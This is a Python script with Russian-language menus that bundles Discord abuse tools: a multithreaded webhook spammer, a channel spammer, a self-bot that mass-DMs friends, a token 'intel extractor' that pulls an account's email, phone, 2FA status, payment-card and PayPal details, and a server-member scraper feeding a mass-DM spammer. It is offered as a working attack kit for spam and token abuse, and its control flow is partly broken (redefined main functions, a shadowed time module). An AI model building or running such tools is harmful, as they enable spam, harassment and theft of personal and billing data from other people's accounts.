import requests
import threading
import time
import os
import sys
import json
import re
from colorama import Fore, Style, init

init(autoreset=True)
print('''  .▄▄ ·  ▄· ▄▌ ▐ ▄ ▄▄▄ . ▄▄▄·.▄▄ ·  ▄· ▄▌
  ▐█ ▀. ▐█▪██▌•█▌▐█▀▄.▀·▐█ ▄█▐█ ▀. ▐█▪██▌
  ▄▀▀▀█▄▐█▌▐█▪▐█▐▐▌▐▀▀▪▄ ██▀·▄▀▀▀█▄▐█▌▐█▪
  ▐█▄▪▐█ ▐█▀·.██▐█▌▐█▄▄▌▐█▪·•▐█▄▪▐█ ▐█▀·.
   ▀▀▀▀   ▀ • ▀▀ █▪ ▀▀▀ .▀    ▀▀▀▀   ▀ • 
 ┍┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┑ 
 |   [!]создатель: scxry                    |
 |   [!]по вопросам писать в дс: 57fckk     |
 |       [1] Webhook Spammer                |
 |       [2] Channel Spammer                |
 |       [3] Mass DM Friends                |
 |       [4] Token Information              |
 |       [5] Scrape Server Members          |
 |       [6] Mass DM from Scraped File      |
 |       [7] Выход                          |
 ┕┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┛''')
a = int(input('>>> '))
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.LIGHTBLACK_EX}    __      __   _                          _ 
{Fore.LIGHTBLACK_EX}    \ \    / /  | |                        | |
{Fore.LIGHTBLACK_EX}     \ \  / /__ | | ___ ___  _ __ ___   ___| |
{Fore.LIGHTBLACK_EX}      \ \/ / _ \| |/ __/ _ \| '_ ` _ \ / _ \ |
{Fore.LIGHTBLACK_EX}       \  / (_) | | (_| (_) | | | | | |  __/_|
{Fore.LIGHTBLACK_EX}        \/ \___/|_|\___\___/|_| |_| |_|\___(_)
{Fore.LIGHTBLACK_EX}                 Webhook Spammer by scxry
    """
    print(banner)
if a == 1:
    def send_message(webhook_url, message_content, username, session):
        """Отправляет одно сообщение на вебхук."""
        payload = {
            "content": message_content,
            "username": username if username else "Webhook Spammer"
        }
        
        try:
            response = session.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                print(f"{Fore.GREEN}[+] Сообщение успешно отправлено!")
            elif response.status_code == 429:
                print(f"{Fore.YELLOW}[!] Нас замедляют (Rate Limit). Ждем {response.json().get('retry_after', 1)} сек.")
                time.sleep(response.json().get('retry_after', 1) / 1000)
            elif response.status_code == 404:
                print(f"{Fore.RED}[X] Ошибка: Вебхук не найден. Возможно, он был удален.")
                return 'stop'
            else:
                print(f"{Fore.RED}[X] Ошибка: {response.status_code} - {response.text}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[X] Ошибка соединения: {e}")
            time.sleep(5)

    def spam_worker(webhook_url, message_content, username):
        session = requests.Session()
        while True:
            if send_message(webhook_url, message_content, username, session) == 'stop':
                break

    def main():
        clear_console()
        print_banner()
        
        try:
            webhook_url = input(f"{Fore.LIGHTBLACK_EX}Введите URL вебхука: {Fore.WHITE}")
            if not webhook_url.startswith("https://discord.com/api/webhooks/"):
                print(f"{Fore.RED}Это не похоже на валидный URL вебхука Discord.")
                sys.exit(1)
                
            message_content = input(f"{Fore.LIGHTBLACK_EX}Введите текст сообщения: {Fore.WHITE}")
            username = input(f"{Fore.LIGHTBLACK_EX}Введите имя отправителя (оставьте пустым для 'Webhook Spammer'): {Fore.WHITE}")
            
            while True:
                try:
                    thread_count = int(input(f"{Fore.CYAN}Введите количество потоков (например, 50): {Fore.WHITE}"))
                    if thread_count > 0:
                        break
                    else:
                        print(f"{Fore.RED}Количество потоков должно быть больше нуля.")
                except ValueError:
                    print(f"{Fore.RED}Пожалуйста, введите число.")

            print(f"\n{Fore.MAGENTA}--- Запуск спама на {thread_count} потоках. Нажмите CTRL+C для остановки. ---")
            
            threads = []
            for _ in range(thread_count):
                thread = threading.Thread(target=spam_worker, args=(webhook_url, message_content, username))
                thread.daemon = True
                threads.append(thread)
                thread.start()
            
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Программа остановлена пользователем.")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Fore.RED}Критическая ошибка: {e}")
            sys.exit(1)

if a == 2:
    msg = input("[+] Введите сообщение: ")
    token = input("[+] Введите токен аккаунта: ")
    adress = input("[+] Введите URL сообщения: ")
    time = int(input("[+] Введите кол-во сообщений: "))
    
    payload = {
    'content': msg
    }

    header = {
        'authorization': token
    }
    for i in range(time):
        r = requests.post(adress, data=payload, headers=header)

elif a == 3:
    init(autoreset=True)

def clear_console():
    """Очищает консоль в зависимости от ОС."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.LIGHTBLACK_EX}███╗   ███╗██████╗  ██████╗ ███╗   ██╗████████╗ ██████╗ ██████╗ 
{Fore.LIGHTBLACK_EX}████╗ ████║██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗██╔══██╗
{Fore.LIGHTBLACK_EX}██╔████╔██║██║  ██║██║   ██║██╔██╗ ██║   ██║   ██║   ██║██████╔╝
{Fore.LIGHTBLACK_EX}██║╚██╔╝██║██║  ██║██║   ██║██║╚██╗██║   ██║   ██║   ██║██╔══██╗
{Fore.LIGHTBLACK_EX}██║ ╚═╝ ██║██████╔╝╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝██║  ██║
{Fore.LIGHTBLACK_EX}╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Fore.LIGHTBLACK_EX}                    DM Friends Tool by scxry
    """
    print(banner)
    print(f"{Fore.RED}{'='*60}")
    print(f"{Fore.RED}ВНИМАНИЕ: Использование селф-ботов - прямое нарушение ToS Discord.")
    print(f"{Fore.RED}Ваш аккаунт будет заблокирован с вероятностью 99%.(наверное:3)")
    print(f"{Fore.RED}{'='*60}\n")

def main():
    clear_console()
    print_banner()

    token = input(f"{Fore.CYAN}Введите ваш токен Discord: {Fore.WHITE}")
    message = input(f"{Fore.CYAN}Введите сообщение для отправки: {Fore.WHITE}")
    
    while True:
        try:
            delay = float(input(f"{Fore.CYAN}Введите задержку между сообщениями в секундах (рекомендуется 2-5): {Fore.WHITE}"))
            if delay >= 0:
                break
            else:
                print(f"{Fore.RED}Задержка не может быть отрицательной.")
        except ValueError:
            print(f"{Fore.RED}Пожалуйста, введите число.")
            
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        print(f"\n{Fore.YELLOW}[*] Получение списка друзей...")
        response = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if response.status_code != 200:
            print(f"{Fore.RED}[X] Ошибка получения друзей: {response.status_code} - {response.text}")
            print(f"{Fore.RED}Возможно, ваш токен недействителен.")
            sys.exit(1)
            
        friends = [friend for friend in response.json() if friend['type'] == 1]
        if not friends:
            print(f"{Fore.YELLOW}[!] У вас нет друзей в списке.")
            sys.exit(0)
            
        print(f"{Fore.GREEN}[+] Найдено друзей: {len(friends)}")
        
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[X] Ошибка сети: {e}")
        sys.exit(1)
    
    session = requests.Session()
    session.headers.update(headers)
    
    for friend in friends:
        user = friend['user']
        username = f"{user['username']}#{user['discriminator']}"
        user_id = user['id']
        
        try:
            print(f"{Fore.CYAN}[->] Отправка сообщения пользователю {username}...")
            
            dm_channel_response = session.post(
                'https://discord.com/api/v9/users/@me/channels',
                json={'recipient_id': user_id}
            )
            
            if dm_channel_response.status_code == 200:
                channel_id = dm_channel_response.json()['id']
                
                send_response = session.post(
                    f'https://discord.com/api/v9/channels/{channel_id}/messages',
                    json={'content': message}
                )
                
                if send_response.status_code == 200:
                    print(f"{Fore.GREEN}[✓] Сообщение для {username} успешно отправлено.")
                else:
                    print(f"{Fore.RED}[X] Не удалось отправить сообщение для {username}: {send_response.status_code} - {send_response.text}")
            else:
                print(f"{Fore.RED}[X] Не удалось открыть ЛС с {username}: {dm_channel_response.status_code}")

            print(f"{Fore.YELLOW}[...] Пауза {delay} сек.")
            time.sleep(delay)
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[X] Ошибка сети при отправке сообщения для {username}: {e}")
            time.sleep(10)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Программа остановлена пользователем.")
            sys.exit(0)
            
    print(f"\n{Fore.GREEN}Рассылка всем друзьям завершена.")

if a == 4:
    init(autoreset=True)

    def print_banner():
        """Печатает баннер."""
        banner = f"""
    {Fore.LIGHTBLACK_EX}╔╦╗╔═╗╔═╗╔╦╗╔╗╔╔═╗  ╦╔╗╔╔═╗╦ ╦
    {Fore.LIGHTBLACK_EX} ║ ║╣ ╠═╣ ║ ║║║║ ║  ║║║║╠═╣╠═╣
    {Fore.LIGHTBLACK_EX} ╩ ╚═╝╩ ╩ ╩ ╚╩╝╚═╝  ╩╝╚╝╩ ╩╩ ╩
    {Fore.LIGHTBLACK_EX}       Token Intel Extractor by scxry
        """
        print(banner)
        print(f"{Fore.RED}{'='*50}\n")

    def get_user_info(session):
        """Получает основную информацию об аккаунте."""
        try:
            response = session.get('https://discord.com/api/v9/users/@me')
            if response.status_code == 200:
                user_data = response.json()
                username = f"{user_data.get('username')}#{user_data.get('discriminator')}"
                user_id = user_data.get('id')
                email = user_data.get('email', 'Нет')
                phone = user_data.get('phone', 'Нет')
                mfa = "Включена" if user_data.get('mfa_enabled') else "Выключена"
                
                print(f"{Fore.GREEN}--- Основная информация ---")
                print(f"{Fore.CYAN}Никнейм:{Style.BRIGHT} {username}")
                print(f"{Fore.CYAN}ID:      {Style.BRIGHT} {user_id}")
                print(f"{Fore.CYAN}Email:   {Style.BRIGHT} {email}")
                print(f"{Fore.CYAN}Телефон: {Style.BRIGHT} {phone}")
                print(f"{Fore.CYAN}2FA:     {Style.BRIGHT} {mfa}\n")
                return True
            else:
                print(f"{Fore.RED}[X] Ошибка: Неверный токен или проблемы с API Discord.")
                print(f"{Fore.RED}Код ответа: {response.status_code} - {response.text}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[X] Ошибка сети: {e}")
            return False

    def get_billing_info(session):
        """Получает платежную информацию."""
        try:
            response = session.get('https://discord.com/api/v9/users/@me/billing/payment-sources')
            if response.status_code == 200:
                payment_sources = response.json()
                print(f"{Fore.GREEN}--- Платежная информация ---")
                if not payment_sources:
                    print(f"{Fore.YELLOW}Платежные методы не найдены.\n")
                    return
                
                for source in payment_sources:
                    if source['type'] == 1:
                        print(f"{Fore.CYAN}Тип: Карта ({source['brand']})")
                        print(f"{Fore.CYAN}  Последние 4 цифры: {source['last_4']}")
                        print(f"{Fore.CYAN}  Срок действия: {source['expires_month']}/{source['expires_year']}")
                    elif source['type'] == 2:
                        print(f"{Fore.CYAN}Тип: PayPal")
                        print(f"{Fore.CYAN}  Email: {source['email']}")
                    print("-" * 20)
                print("")
            else:
                print(f"{Fore.YELLOW}[!] Не удалось получить платежную информацию: {response.status_code}\n")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[X] Ошибка сети при получении платежной информации.\n")

    def get_relationships(session):
        """Получает список друзей."""
        try:
            response = session.get('https://discord.com/api/v9/users/@me/relationships')
            if response.status_code == 200:
                friends = [rel for rel in response.json() if rel['type'] == 1]
                print(f"{Fore.GREEN}--- Друзья ({len(friends)}) ---")
                if not friends:
                    print(f"{Fore.YELLOW}Список друзей пуст.\n")
                    return
                
                for friend in friends:
                    user = friend['user']
                    print(f"{Fore.CYAN}- {user['username']}#{user['discriminator']}")
                print("")
            else:
                print(f"{Fore.YELLOW}[!] Не удалось получить список друзей: {response.status_code}\n")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[X] Ошибка сети при получении списка друзей.\n")

    def get_guilds(session):
        """Получает список серверов."""
        try:
            response = session.get('https://discord.com/api/v9/users/@me/guilds')
            if response.status_code == 200:
                guilds = response.json()
                print(f"{Fore.GREEN}--- Серверы ({len(guilds)}) ---")
                if not guilds:
                    print(f"{Fore.YELLOW}Пользователь не состоит на серверах.\n")
                    return
                
                for guild in guilds:
                    owner_status = f"{Fore.YELLOW}[ВЛАДЕЛЕЦ]" if guild['owner'] else ""
                    print(f"{Fore.CYAN}- {guild['name']} (ID: {guild['id']}) {owner_status}")
                print("")
            else:
                print(f"{Fore.YELLOW}[!] Не удалось получить список серверов: {response.status_code}\n")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[X] Ошибка сети при получении списка серверов.\n")


    def main():
        clear_console()
        print_banner()
        
        token = input(f"{Fore.CYAN}Введите токен для анализа: {Fore.WHITE}")
        
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        session = requests.Session()
        session.headers.update(headers)
        
        print(f"\n{Fore.YELLOW}Начинаю сбор информации...\n")
        
        if get_user_info(session):
            get_billing_info(session)
            get_relationships(session)
            get_guilds(session)
        
        print(f"{Fore.GREEN}Анализ завершен.")
if a == 5:
    init(autoreset=True)

    def clear_console():
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner():
        banner = f"""
    {Fore.LIGHTBLACK_EX}██████╗ ██╗███████╗ ██████╗  ██████╗ ██╗   ██╗██████╗ 
    {Fore.LIGHTBLACK_EX}██╔══██╗██║██╔════╝██╔═══██╗██╔═══██╗██║   ██║██╔══██╗
    {Fore.LIGHTBLACK_EX}██║  ██║██║███████╗██║   ██║██║   ██║██║   ██║██████╔╝
    {Fore.LIGHTBLACK_EX}██║  ██║██║╚════██║██║   ██║██║   ██║██║   ██║██╔══██╗
    {Fore.LIGHTBLACK_EX}██████╔╝██║███████║╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║
    {Fore.LIGHTBLACK_EX}╚═════╝ ╚═╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    {Fore.LIGHTBLACK_EX}              
        """
        print(banner)

    def scrape_members(session, guild_id, output_dir):
        print(f"{Fore.YELLOW}[*] Начинаю парсинг участников...")
        all_members, last_user_id = [], '0'
        while True:
            try:
                url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={last_user_id}'
                response = session.get(url)
                if response.status_code != 200:
                    print(f"{Fore.RED}[X] Ошибка парсинга участников: {response.status_code} - {response.text}")
                    return None
                members = response.json()
                if not members: break
                all_members.extend(members)
                last_user_id = members[-1]['user']['id']
                print(f"{Fore.CYAN}[+] Собрано {len(all_members)} участников...")
                time.sleep(0.5)
            except Exception as e:
                print(f"{Fore.RED}[X] Ошибка: {e}")
                break
        
        print(f"{Fore.GREEN}[✓] Парсинг участников завершен. Всего: {len(all_members)}.")
        simple_path = os.path.join(output_dir, 'members.txt')
        with open(simple_path, 'w', encoding='utf-8') as f:
            for member in all_members:
                user = member['user']
                f.write(f"{user['username']}#{user['discriminator']} (ID: {user['id']})\n")
        print(f"{Fore.GREEN}[+] Данные участников сохранены в {simple_path}")
        return simple_path

    def run_scraper(token):
        last_successful_path = None
        while True:
            clear_console()
            print_banner()
            print(f"{Fore.MAGENTA}--- Модуль: Парсер Сервера ---\n")
            guild_id = input(f"{Fore.CYAN}Введите ID сервера (Guild ID) или 'm' для выхода в меню: {Fore.WHITE}")
            if guild_id.lower() == 'm': break
            headers = {'Authorization': token}
            session = requests.Session()
            session.headers.update(headers)
            output_dir = f"scraped_{guild_id}"
            os.makedirs(output_dir, exist_ok=True)
            print(f"\n{Fore.YELLOW}Результаты будут сохранены в папку: {output_dir}")
            file_path = scrape_members(session, guild_id, output_dir)
            if file_path:
                last_successful_path = file_path
                print(f"\n{Fore.GREEN}Парсинг сервера {guild_id} завершен.")
            else:
                print(f"\n{Fore.RED}Парсинг сервера {guild_id} не удался.")
            another = input(f"\n{Fore.CYAN}Парсить другой сервер? (Y/n): {Fore.WHITE}").lower()
            if another == 'n': break
        return last_successful_path

    def run_mass_dm(token, target_file_path): 
        """Управляет модулем массовой рассылки, используя УЖЕ ИЗВЕСТНЫЙ путь к файлу."""
        clear_console(); print_banner()
        print(f"{Fore.MAGENTA}--- Модуль: Массовая Рассылка по ID ---\n")
        print(f"{Fore.GREEN}Используется файл: {target_file_path}\n")
        
        message = input(f"{Fore.CYAN}Введите сообщение для отправки: {Fore.WHITE}")
        
        while True:
            try:
                delay = float(input(f"{Fore.CYAN}Введите задержку (сек, рекомендуется 3-10): {Fore.WHITE}"))
                if delay >= 0: break
                else: print(f"{Fore.RED}Задержка не может быть отрицательной.")
            except ValueError: print(f"{Fore.RED}Пожалуйста, введите число.")
        
        headers = {'Authorization': token}
        session = requests.Session()
        session.headers.update(headers)
        
        user_ids = [match.group(1) for line in open(target_file_path, 'r', encoding='utf-8') if (match := re.search(r'KATEX_INLINE_OPENID: (\d+)KATEX_INLINE_CLOSE', line))]
        
        if not user_ids:
            print(f"{Fore.YELLOW}[!] В файле не найдено ID.")
            return
            
        print(f"\n{Fore.GREEN}[+] Найдено {len(user_ids)} ID. Начинаю рассылку...")
        
        for i, user_id in enumerate(user_ids, 1):
            try:
                print(f"{Fore.CYAN}[{i}/{len(user_ids)}] Отправка -> {user_id}")
                dm_channel_res = session.post('https://discord.com/api/v9/users/@me/channels', json={'recipient_id': user_id})
                if dm_channel_res.status_code == 200:
                    channel_id = dm_channel_res.json()['id']
                    send_res = session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': message})
                    if send_res.status_code == 200: print(f"{Fore.GREEN}[✓] Успешно отправлено.")
                    elif send_res.status_code == 403: print(f"{Fore.YELLOW}[!] Не удалось отправить: Пользователь закрыл ЛС.")
                    else: print(f"{Fore.RED}[X] Ошибка отправки: {send_res.status_code}")
                else: print(f"{Fore.RED}[X] Не удалось открыть ЛС: {dm_channel_res.status_code}")
                time.sleep(delay)
            except KeyboardInterrupt: print(f"\n{Fore.YELLOW}Программа остановлена."); break
            except Exception as e: print(f"{Fore.RED}[X] Критическая ошибка: {e}"); time.sleep(10)
        print(f"\n{Fore.GREEN}Рассылка завершена.")

    def main():
        last_scraped_file = None
        token = None

        while True:
            clear_console()
            print_banner()
            
            print(f"{Fore.RED}{'='*60}")
            print(f"{Fore.RED}ВНИМАНИЕ: Использование этого инструмента с пользовательским")
            print(f"{Fore.RED}токеном почти гарантированно приведет к блокировке аккаунта.")
            print(f"{Fore.RED}{'='*60}\n")
            
            if last_scraped_file:
                print(f"{Fore.GREEN}Готов к рассылке файл: {last_scraped_file}\n")

            print(Fore.MAGENTA + "--- Главное Меню ---")
            print(f"{Fore.CYAN}[1] Scrape Server (Парсер сервера)")
            print(f"{Fore.CYAN}[2] Mass DM from File (Массовая рассылка по ID)")
            print(f"{Fore.CYAN}[3] Ввести/Сменить токен")
            print(f"{Fore.CYAN}[4] Выход")
            
            choice = input(f"{Fore.YELLOW}Выберите действие: {Fore.WHITE}")
            
            if not token and choice in ['1', '2']:
                token = input(f"\n{Fore.CYAN}Введите ваш токен Discord для этой сессии: {Fore.WHITE}")

            if choice == '1':
                new_path = run_scraper(token)
                if new_path:
                    last_scraped_file = new_path
            elif choice == '2':

                if last_scraped_file:
                    run_mass_dm(token, last_scraped_file)
                else:
                    print(f"\n{Fore.RED}[!] Сначала необходимо спарсить сервер (опция 1).")
                    print(f"{Fore.YELLOW}    Файл с ID участников еще не создан.")
            elif choice == '3':
                token = input(f"\n{Fore.CYAN}Введите новый токен Discord: {Fore.WHITE}")
                print(f"{Fore.GREEN}Токен обновлен.")
            elif choice == '4':
                break
            else:
                print(f"{Fore.RED}Неверный выбор.")
            
            print("\nНажмите Enter, чтобы вернуться в меню...")
            input()


if __name__ == "__main__":
    main()
